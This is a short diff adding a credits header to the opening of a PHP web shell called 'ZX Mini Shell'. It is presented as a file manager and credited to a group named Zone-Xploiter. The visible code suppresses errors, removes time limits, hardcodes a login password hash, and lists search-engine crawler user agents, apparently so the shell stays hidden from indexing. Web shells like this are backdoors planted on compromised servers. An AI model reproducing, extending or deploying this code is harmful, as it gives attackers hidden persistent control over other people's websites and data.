@@ -1,11 +1,24 @@
 <?php
+/**
+ * ZX Mini Shell - PHP Web File Manager
+ * 
+ * Version: 2.0.0
+ * 
+ * Version History & Credits:
+ * - V1.0 (Original Development) : Wongedan (https://github.com/wongedan123)
+ * - V2.0 (Redesign & Modern UX) : ZXMarchia (https://github.com/notbell1) / Zone-Xploiter (https://github.com/Zone-Xploiter)
+ * 
+ * License: MIT
+ */
 session_start();
 error_reporting(0);
 set_time_limit(0);
 
 
 // LOGIN
+// GENERATE BCRYPT = https://bcrypt-generator.com/
 $auth_pass = '$2a$12$QKXm8Ps1Yu9Vy5paliQtweQwH2dfgS6Qid2YDV.z6j3017FyiIetm'; // Zonex
+
 
 if(!empty($_SERVER['HTTP_USER_AGENT'])) {
     $userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot");
